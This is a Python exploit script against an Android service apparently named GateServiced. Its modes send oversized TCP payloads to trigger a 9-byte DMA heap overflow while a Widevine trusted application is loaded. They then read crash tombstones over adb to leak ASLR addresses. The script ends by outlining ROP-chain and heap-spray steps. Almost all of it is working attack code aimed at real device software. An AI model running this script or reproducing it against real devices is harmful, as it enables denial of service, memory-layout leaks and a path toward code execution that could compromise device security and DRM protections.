#!/usr/bin/env python3
"""
GateServiced DMA Heap Overflow Exploit
=======================================
VULNERABILITY: run_exec_cmd_ta has a 9-byte heap overflow on the DMA buffer.

DMA buffer layout (from full disassembly):
  Offset  0:  magic   (1 byte,  0x55)
  Offset  1:  cmd_id  (4 bytes, LE)
  Offset  5:  input_len (8 bytes, LE)  
  Offset 13:  input_data (input_len bytes, USER CONTROLLED)
  Total:      13 + input_len

DMA buffer allocated with dma_alloc(allocator, max_out, &fd, &ptr).
  Internal call: max_out = 0x400 (1024)   → max safe input = 1011
  TCP call:      max_out = 0x5000 (20480) → max safe input = 20467

TCP payload max = recv(0x5000) - 4 = 20476 bytes.
Overflow = 20476 - 20467 = 9 bytes past DMA buffer end.

OBSERVATION: crash_probe showed "EXEC with max payload" (20476B) returned
in 148ms instead of normal 3000-5000ms timeout. This strongly suggests
dma_alloc SUCCEEDS and the overflow causes a crash (process restart).

Usage:
  adb forward tcp:8341 tcp:8341
  python gate_dma_overflow.py [mode]

Modes:
  boundary    — Find exact overflow boundary (safe → crash transition)
  reproduce   — Reproduce the 148ms crash with max payload
  tombstone   — Check device for crash reports after overflow
  exploit     — Attempt controlled heap overflow exploitation
"""

import socket
import struct
import sys
import time
import subprocess

TARGET_IP   = "127.0.0.1"
TARGET_PORT = 8341

CMD_LOAD_TA    = 0x00010003
CMD_UNLOAD_TA  = 0x00010004
CMD_EXEC       = 0x00010002  # Version query (any non-LOAD/UNLOAD cmd_id)
WIDEVINE_PATH  = b"/vendor/firmware_mnt/image/widevine.mbn\x00"

DMA_HEADER_SIZE = 13        # magic(1) + cmd_id(4) + input_len(8)
DMA_BUFFER_SIZE = 0x5000    # 20480 (max_out for TCP)
MAX_SAFE_INPUT  = DMA_BUFFER_SIZE - DMA_HEADER_SIZE  # 20467
MAX_TCP_INPUT   = DMA_BUFFER_SIZE - 4                 # 20476 (recv - cmd_id)
OVERFLOW_BYTES  = MAX_TCP_INPUT - MAX_SAFE_INPUT      # 9


def send_recv(cmd_id, payload=b"", timeout=5):
    """Send cmd and recv, distinguishing timeout vs connection-close vs response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((TARGET_IP, TARGET_PORT))
        packet = struct.pack("<I", cmd_id) + payload
        t0 = time.monotonic()
        sock.sendall(packet)
        response = sock.recv(8192)
        elapsed = (time.monotonic() - t0) * 1000
        sock.close()
        if response == b"":
            return "CLOSED", elapsed, b""
        return "RESPONSE", elapsed, response
    except socket.timeout:
        elapsed = (time.monotonic() - t0) * 1000
        try: sock.close()
        except: pass
        return "TIMEOUT", elapsed, b""
    except ConnectionResetError:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else 0
        try: sock.close()
        except: pass
        return "RESET", elapsed, b""
    except ConnectionRefusedError:
        return "REFUSED", 0, b""
    except BrokenPipeError:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else 0
        try: sock.close()
        except: pass
        return "BROKEN_PIPE", elapsed, b""
    except Exception as e:
        try: sock.close()
        except: pass
        return f"ERROR:{e}", 0, b""


def ensure_loaded():
    """Load widevine TA, return True on success."""
    status, ms, resp = send_recv(CMD_LOAD_TA, WIDEVINE_PATH, timeout=10)
    if status == "RESPONSE" and b"succeed" in resp:
        print(f"  [+] TA loaded ({ms:.1f}ms)")
        return True
    print(f"  [-] TA load failed: {status} ({ms:.1f}ms)")
    return False


def check_service_alive():
    """Quick check if GateServiced is accepting connections."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((TARGET_IP, TARGET_PORT))
        sock.close()
        return True
    except:
        return False


def mode_reproduce():
    """Reproduce the 148ms crash observation with exact 20476-byte payload."""
    print("=" * 70)
    print("MODE: REPRODUCE (verify 148ms crash with max payload)")
    print("=" * 70)
    print()
    print(f"DMA buffer: {DMA_BUFFER_SIZE}B, header: {DMA_HEADER_SIZE}B")
    print(f"Max safe input: {MAX_SAFE_INPUT}B, max TCP input: {MAX_TCP_INPUT}B")
    print(f"Overflow: {OVERFLOW_BYTES} bytes")
    print()

    if not ensure_loaded():
        return

    time.sleep(0.5)

    # Test 1: Normal EXEC (small payload) for baseline
    print("\n[1] Baseline: small EXEC payload (4 bytes)")
    for i in range(3):
        status, ms, resp = send_recv(CMD_EXEC, struct.pack("<I", 0x100), timeout=5)
        print(f"    Trial {i+1}: {status} ({ms:.1f}ms)")
        time.sleep(0.3)

    time.sleep(0.5)
    ensure_loaded()
    time.sleep(0.5)

    # Test 2: Max payload (20476 bytes) — should trigger overflow
    print(f"\n[2] MAX PAYLOAD: {MAX_TCP_INPUT} bytes (overflow: {OVERFLOW_BYTES}B)")
    for i in range(5):
        payload = b"A" * MAX_TCP_INPUT
        status, ms, resp = send_recv(CMD_EXEC, payload, timeout=5)
        marker = ""
        if status in ("CLOSED", "RESET", "REFUSED"):
            marker = " ← CRASH?"
        elif ms < 1000 and status == "TIMEOUT":
            marker = " ← FAST TIMEOUT (suspicious)"
        print(f"    Trial {i+1}: {status:>10} ({ms:.1f}ms){marker}")
        
        if status in ("REFUSED",):
            print("    [!] Service down, waiting for restart...")
            for _ in range(10):
                time.sleep(1)
                if check_service_alive():
                    print("    [+] Service restarted")
                    break
        time.sleep(1)

    time.sleep(1)

    # Test 3: Check if service is still alive
    print(f"\n[3] Post-test: service alive?")
    alive = check_service_alive()
    print(f"    {'YES' if alive else 'NO'}")
    if alive:
        ensure_loaded()


def mode_boundary():
    """Find the exact overflow boundary by testing increasing payload sizes."""
    print("=" * 70)
    print("MODE: BOUNDARY (find overflow threshold)")
    print("=" * 70)
    print()
    print(f"Theory: overflow starts at input_len > {MAX_SAFE_INPUT}")
    print(f"Testing sizes from {MAX_SAFE_INPUT - 5} to {MAX_TCP_INPUT}")
    print()

    if not ensure_loaded():
        return

    time.sleep(0.5)

    # Test sizes around the boundary
    sizes = list(range(MAX_SAFE_INPUT - 5, min(MAX_SAFE_INPUT + 15, MAX_TCP_INPUT + 1)))
    sizes.append(MAX_TCP_INPUT)

    print(f"{'Size':>7} {'Status':>10} {'Time':>10}  Notes")
    print("-" * 50)

    for size in sizes:
        needs_reload = False
        
        payload = b"\x42" * size
        status, ms, resp = send_recv(CMD_EXEC, payload, timeout=5)

        overflow = max(0, size - MAX_SAFE_INPUT)
        notes = ""
        if overflow > 0:
            notes = f"overflow={overflow}B"
        if status in ("CLOSED", "RESET", "REFUSED"):
            notes += " CRASH!"
            needs_reload = True
        elif ms < 1000 and status == "TIMEOUT":
            notes += " fast-timeout!"

        print(f"  {size:>5}B {status:>10} {ms:>8.1f}ms  {notes}")

        if needs_reload:
            time.sleep(2)
            for _ in range(10):
                time.sleep(1)
                if check_service_alive():
                    break
            ensure_loaded()
            time.sleep(0.5)
        else:
            time.sleep(0.5)
            # Re-load TA if EXEC consumed it
            ensure_loaded()
            time.sleep(0.3)


def mode_tombstone():
    """Check device for crash tombstones from the DMA overflow."""
    print("=" * 70)
    print("MODE: TOMBSTONE CHECK")
    print("=" * 70)
    print()
    print("Checking device for crash reports...")
    print()

    try:
        # List tombstones
        result = subprocess.run(
            ["adb", "shell", "ls", "-la", "/data/tombstones/"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            print("[Tombstones directory]:")
            print(result.stdout)
        else:
            print(f"[!] Cannot read tombstones: {result.stderr.strip()}")

        # Check for GateServiced in recent tombstones
        result2 = subprocess.run(
            ["adb", "shell", "grep", "-l", "GateServiced", "/data/tombstones/tombstone_*"],
            capture_output=True, text=True, timeout=10
        )
        if result2.returncode == 0 and result2.stdout.strip():
            print(f"\n[★★★] GateServiced crash found in:")
            for f in result2.stdout.strip().split('\n'):
                print(f"  {f}")
                # Read the relevant part
                result3 = subprocess.run(
                    ["adb", "shell", "head", "-80", f],
                    capture_output=True, text=True, timeout=10
                )
                if result3.returncode == 0:
                    print(result3.stdout)
        else:
            print("[*] No GateServiced crashes in tombstones")
            print("    (may need permission, or crashes don't generate tombstones)")

        # Check logcat for recent crashes
        print("\n[*] Checking logcat for recent crashes...")
        result4 = subprocess.run(
            ["adb", "shell", "logcat", "-d", "-t", "100", "-s", "DEBUG:*"],
            capture_output=True, text=True, timeout=10
        )
        if result4.returncode == 0:
            lines = [l for l in result4.stdout.split('\n') if 'GateServiced' in l or 'gate' in l.lower()]
            if lines:
                print("[★] GateServiced in debug log:")
                for l in lines[:20]:
                    print(f"  {l}")
            else:
                print("[*] No GateServiced entries in recent debug log")
        
        # Check dmesg for OOM or heap issues
        print("\n[*] Checking dmesg for DMA/heap issues...")
        result5 = subprocess.run(
            ["adb", "shell", "dmesg", "|", "grep", "-i", "dma\\|heap\\|oom\\|gate"],
            capture_output=True, text=True, timeout=10
        )
        if result5.returncode == 0 and result5.stdout.strip():
            lines = result5.stdout.strip().split('\n')
            for l in lines[-20:]:
                print(f"  {l}")

    except FileNotFoundError:
        print("[!] ADB not found. Run on a machine with ADB access.")
    except Exception as e:
        print(f"[!] Error: {e}")


def mode_exploit():
    """Attempt controlled DMA heap overflow exploitation."""
    print("=" * 70)
    print("MODE: EXPLOIT (controlled DMA heap overflow)")
    print("=" * 70)
    print()
    print("Strategy: Overflow 9 bytes past DMA buffer end.")
    print("The overflow bytes are the LAST 9 bytes of our input.")
    print("These overwrite whatever follows the DMA buffer in the DMA heap.")
    print()
    print("Heap metadata corruption → crash → tombstone with:")
    print("  - Register dump (X0-X30, SP, PC)")
    print("  - Memory map (/proc/PID/maps)")
    print("  - Stack trace")
    print("  → Reveals ASLR base addresses for GateServiced, libc, etc.")
    print()

    if not ensure_loaded():
        return

    time.sleep(0.5)

    # Phase 1: Confirm crash with max payload
    print("[Phase 1] Confirm crash with marker pattern")
    
    # Fill payload with pattern: SAFE region (20467 'S') + OVERFLOW region (9 bytes 'OVFLW\xde\xad\xbe\xef')
    safe_fill = b"S" * MAX_SAFE_INPUT
    overflow_marker = b"OVFL" + b"\xde\xad\xbe\xef" + b"\x42"  # 9 bytes
    payload = safe_fill + overflow_marker
    assert len(payload) == MAX_TCP_INPUT, f"Payload size mismatch: {len(payload)} != {MAX_TCP_INPUT}"

    print(f"  Payload: {MAX_SAFE_INPUT}B safe + {len(overflow_marker)}B overflow")
    print(f"  Overflow content: {overflow_marker.hex()}")
    
    status, ms, resp = send_recv(CMD_EXEC, payload, timeout=8)
    print(f"  Result: {status} ({ms:.1f}ms)")

    if status in ("CLOSED", "RESET"):
        print(f"  [★] Connection {status} — likely crash!")
        print(f"  [*] Waiting for service restart...")
        time.sleep(3)
        for _ in range(15):
            if check_service_alive():
                print(f"  [+] Service restarted")
                break
            time.sleep(1)
        else:
            print(f"  [!] Service not restarting — may need manual restart")
            return

        # Phase 2: Read tombstone
        print(f"\n[Phase 2] Check tombstone for crash details")
        mode_tombstone()

    elif ms < 1000:
        print(f"  [!] Fast return ({ms:.0f}ms) — might be a crash")
        time.sleep(3)
        mode_tombstone()
    else:
        print(f"  [*] Normal timeout — DMA alloc may have failed (no overflow)")
        print(f"  [*] Try with smaller overflow to test hypothesis:")
        
        # Test sizes that barely overflow
        for overflow_size in [1, 2, 4, 8, 9]:
            time.sleep(0.5)
            ensure_loaded()
            time.sleep(0.3)
            
            input_size = MAX_SAFE_INPUT + overflow_size
            if input_size > MAX_TCP_INPUT:
                break
            payload = b"T" * MAX_SAFE_INPUT + b"\xff" * overflow_size
            status, ms, resp = send_recv(CMD_EXEC, payload, timeout=5)
            print(f"    overflow={overflow_size}B: {status} ({ms:.1f}ms)")

    print()
    print("=" * 70)
    print("NEXT STEPS:")
    print("1. If crashes confirmed → check 'adb logcat -d -s DEBUG:*' for tombstone")
    print("2. If tombstone found → extract PC, SP, ASLR bases")
    print("3. Use ASLR bases to craft ROP chain in overflow region")
    print("4. Alternatively: heap spray + overflow for controlled write")
    print("=" * 70)


def main():
    global TARGET_IP
    args = sys.argv[1:]
    for a in list(args):
        if a.startswith("--ip="):
            TARGET_IP = a.split("=", 1)[1]
            args.remove(a)

    modes = {
        "reproduce": mode_reproduce,
        "boundary": mode_boundary,
        "tombstone": mode_tombstone,
        "exploit": mode_exploit,
    }

    if not args or args[0] not in modes:
        print(__doc__)
        print(f"Available modes: {', '.join(modes.keys())}")
        sys.exit(1)

    print(f"\n[Config] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[Config] DMA overflow: {OVERFLOW_BYTES}B at input > {MAX_SAFE_INPUT}B\n")
    modes[args[0]]()


if __name__ == "__main__":
    main()
